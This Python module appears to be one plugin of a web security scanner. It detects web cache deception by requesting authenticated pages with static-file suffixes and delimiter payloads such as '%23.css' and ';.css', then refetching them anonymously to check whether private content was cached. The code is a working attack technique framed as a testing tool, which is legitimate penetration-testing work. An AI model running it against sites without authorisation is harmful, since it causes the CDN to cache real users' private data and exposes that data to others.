#!/usr/bin/env python3
"""
Web Cache Deception Scanner — Detecção real de cache deception
Compara respostas com e sem path extension para detectar caching indevido
Captura raw request/response
"""
import json
import time
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_raw_request, format_raw_response

try:
    import httpx
except ImportError:
    httpx = None


CACHE_EXTENSIONS = [
    ".css", ".js", ".jpg", ".png", ".gif", ".ico", ".svg",
    ".woff", ".woff2", ".ttf", ".eot",
    ".json", ".xml",
]

# V10.4: Path delimiter confusion payloads
CACHE_DELIMITER_PAYLOADS = [
    "%23.css",    # # encoded → some CDNs use fragment as path
    "%3F.css",    # ? encoded → query string confusion
    ";.css",      # semicolon → path parameter delimiter (Tomcat, Spring)
    "%00.css",    # null byte → truncation
    "/.css",      # extra slash
]

CACHE_HEADERS = [
    "x-cache", "cf-cache-status", "x-varnish", "age",
    "x-fastly-request-id", "x-served-by", "x-cache-hits",
]

# Headers que indicam que cache deception é impossível nesta rota
NOCACHE_DIRECTIVES = ["no-store", "no-cache", "private"]


def test_cache_deception(url, auth_headers):
    """Testa cache deception injetando state e validando diff anônimo.
    Cada invocação cria seu próprio httpx.Client para thread-safety.
    """
    findings = []

    try:
        # Client autenticado (sessão da vítima)
        with httpx.Client(verify=False, follow_redirects=True, timeout=15) as auth_client:
            # 1. Baseline: Dados restritos do usuário (Logado)
            r_auth = auth_client.get(url, headers=auth_headers)
            if r_auth.status_code != 200 or len(r_auth.text) < 100:
                return []  # Só prosseguimos em rotas válidas de usuário

            # Pre-check: Se Cache-Control impede caching, aborta (economia de requests)
            cc = r_auth.headers.get("cache-control", "").lower()
            if any(d in cc for d in NOCACHE_DIRECTIVES):
                return []

            # Pre-check: Se Vary: Cookie, cache deception padrão é improvável
            vary = r_auth.headers.get("vary", "").lower()
            if "cookie" in vary:
                return []

        # Client anônimo separado (sem cookies contaminados do auth_client)
        with httpx.Client(verify=False, follow_redirects=True, timeout=15) as anon_client:
            # 2. Baseline: Dados Anônimos (Deslogado)
            r_anon_base = anon_client.get(url)

            import difflib
            # Se Anônimo e Logado forem quase iguais, a rota é publica ou auth falhou. Aborta!
            if len(r_anon_base.text) > 0:
                ratio_base = difflib.SequenceMatcher(None, r_auth.text[:2000], r_anon_base.text[:2000]).ratio()
                if ratio_base > 0.95:
                    # O auth nao teve efeito na resposta ou rota pública
                    return []

            # 3. Ataque: CDN State Poisoning
            # V10.6: Testar extensões normais + delimiter confusion payloads
            all_payloads = []
            for ext in CACHE_EXTENSIONS[:3]:
                all_payloads.append(f"/wcd_test{ext}")
            for delim in CACHE_DELIMITER_PAYLOADS:
                all_payloads.append(f"/wcd_test{delim}")

            for payload_path in all_payloads:
                test_url = url.rstrip("/") + payload_path

                # 3.A: Vítima (logada) acessa link, forçando o CDN a cachear seus dados como estático
                try:
                    with httpx.Client(verify=False, follow_redirects=True, timeout=15) as poison_client:
                        poison_client.get(test_url, headers=auth_headers)
                except Exception:
                    continue

                # Delay para propagação de cache no CDN edge
                time.sleep(1.0)

                # 3.B: Atacante (Anônimo) acessa o mesmo link — múltiplas tentativas
                r_leak = None
                for attempt in range(3):
                    try:
                        r_leak = anon_client.get(test_url)
                        if r_leak.status_code == 200:
                            break
                    except Exception:
                        pass
                    if attempt < 2:
                        time.sleep(0.5)

                if r_leak is None or r_leak.status_code != 200:
                    continue

                # O atacante anônimo conseguiu ver a mesma tela do usuário logado?
                leak_ratio = difflib.SequenceMatcher(None, r_auth.text[:5000], r_leak.text[:5000]).ratio()
                anon_to_leak_ratio = difflib.SequenceMatcher(None, r_anon_base.text[:5000], r_leak.text[:5000]).ratio()

                # V11: Thresholds mais restritivos para zero falsos positivos
                # leak deve ser muito similar ao perfil logado E muito diferente do anônimo padrão
                if leak_ratio > 0.90 and anon_to_leak_ratio < 0.70:

                    cache_info = ""
                    for ch in CACHE_HEADERS:
                        val = r_leak.headers.get(ch, "")
                        if val:
                            cache_info += f"{ch}: {val}; "

                    raw_req = format_raw_request("GET", test_url, dict(r_leak.request.headers))
                    raw_res = format_raw_response(r_leak.status_code, dict(r_leak.headers), r_leak.text[:2000])

                    findings.append({
                        "url": url,
                        "test_url": test_url,
                        "type": "WEB CACHE DECEPTION",
                        "extension": payload_path,
                        "risk": "CRITICAL",
                        "status": r_leak.status_code,
                        "cache_headers": cache_info,
                        "similarity_to_auth": f"{leak_ratio:.0%}",
                        "similarity_to_anon": f"{anon_to_leak_ratio:.0%}",
                        "details": f"Informações privadas do usuário foram cacheadas no CDN (Edge) via payload '{payload_path}' e vazadas em sessões anônimas.",
                        "request_raw": raw_req,
                        "response_raw": raw_res,
                    })
                    break  # Somente 1 leak por URL está ótimo

    except Exception as e:
        warn(f"   [WCD] Erro ao testar {url}: {str(e)[:120]}")

    return findings


def run(context: dict):
    target = context.get("target")
    if not target:
        raise ValueError("Target required")
    if not httpx:
        return []

    info(
        f"\n🟦───────────────────────────────────────────────────────────🟦\n"
        f"   🗃️  {C.BOLD}{C.CYAN}WEB CACHE DECEPTION (WCD) SCANNER{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟦───────────────────────────────────────────────────────────🟦\n"
    )

    outdir = ensure_outdir(target, "cache_deception")
    results_file = outdir / "cache_deception.json"

    # Obter credenciais para realizar o Diff
    auth_data = context.get("cookie", "")
    auth_file = Path("output") / target / "auth_session.txt"
    if not auth_data and auth_file.exists():
        auth_data = auth_file.read_text(errors="ignore").strip()

    # Sanitizar: remover newlines internas que quebram headers HTTP
    if auth_data:
        auth_data = " ".join(auth_data.splitlines()).strip()

    if not auth_data:
        info("   [i] Não há conta autenticada (auth_session.txt). WCD completo pulado na varredura anônima.")
        results_file.write_text("[]")
        return [str(results_file)]

    info("   [+] Baseline de Autenticação Carregada com sucesso!")
    # V11: Parsing robusto do header de auth
    auth_headers = {}
    if auth_data.lower().startswith("bearer ") or auth_data.lower().startswith("basic "):
        auth_headers["Authorization"] = auth_data
    elif "=" in auth_data and not auth_data.startswith("Authorization:"):
        auth_headers["Cookie"] = auth_data
    elif ":" in auth_data:
        key, _, val = auth_data.partition(":")
        auth_headers[key.strip()] = val.strip()
    else:
        auth_headers["Authorization"] = auth_data

    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists():
        urls_file = Path("output") / target / "domain" / "urls_valid.txt"
    if not urls_file.exists():
        return []

    all_urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
    static_exts = {".js", ".css", ".png", ".jpg", ".gif", ".svg", ".ico", ".woff", ".woff2"}

    # Filtrar URLs estáticas e remover fragments
    testable = []
    for u in all_urls:
        parsed = urlparse(u)
        if any(parsed.path.lower().endswith(e) for e in static_exts):
            continue
        # Remover fragments (#section) que não são enviados ao servidor
        clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        if parsed.query:
            clean_url += f"?{parsed.query}"
        testable.append(clean_url)
        if len(testable) >= 100:
            break

    if not testable:
        info("   [i] Nenhuma URL dinâmica propensa a Cache Deception identificada.")
        results_file.write_text("[]")
        return [str(results_file)]

    info(f"   📊 Disparando Teste Multi-Fase (Base >> Poison >> Leak) em {len(testable)} URLs dinâmicas...")
    all_findings = []

    # V11: Cada thread cria seu próprio httpx.Client (thread-safety)
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(test_cache_deception, url, auth_headers): url for url in testable}

        for future in as_completed(futures):
            try:
                results = future.result()
                if results:
                    all_findings.extend(results)
                    for r in results:
                        info(f"   🚨 {C.RED}Web Cache Deception Confirmado:{C.END} Dados Privados Vazaram em {r['test_url']}")
            except Exception as e:
                warn(f"   [WCD] Thread error: {str(e)[:100]}")

    results_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))
    if all_findings:
        success(f"\n☢️  {len(all_findings)} endpoints CRÍTICOS com Web Cache Deception exportados!")
    else:
        success("\n✅ CDN/Edges Resilientes: Nenhum Web Cache Deception encontrado.")

    return [str(results_file)]
